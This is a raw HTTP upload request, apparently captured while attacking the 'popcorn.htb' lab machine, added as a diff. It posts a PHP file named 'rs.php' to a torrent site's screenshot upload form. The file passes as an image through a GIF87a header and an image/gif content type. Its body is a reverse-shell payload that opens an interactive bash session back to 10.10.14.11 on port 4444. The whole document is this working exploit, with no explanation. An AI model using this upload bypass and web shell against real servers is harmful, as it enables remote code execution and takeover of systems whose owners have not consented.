@@ -1,0 +1,28 @@
+POST /torrent/upload_file.php?mode=upload&id=ed6106425c8fd7635cf9160f1e7f7eb5ff1366d5 HTTP/1.1
+Host: popcorn.htb
+Content-Length: 374
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://popcorn.htb
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBqdknE02TXAj3VxC
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://popcorn.htb/torrent/edit.php?mode=edit&id=ed6106425c8fd7635cf9160f1e7f7eb5ff1366d5
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: /torrent/login.php=; /torrent/=; saveit_1=0; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/torrents.php=; PHPSESSID=20a459a54d5c100b5703d5e2882822ad
+Connection: close
+
+------WebKitFormBoundaryBqdknE02TXAj3VxC
+Content-Disposition: form-data; name="file"; filename="rs.php"
+Content-Type: image/gif
+
+GIF87a;<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");
+?>
+
+------WebKitFormBoundaryBqdknE02TXAj3VxC
+Content-Disposition: form-data; name="submit"
+
+Submit Screenshot
+------WebKitFormBoundaryBqdknE02TXAj3VxC--
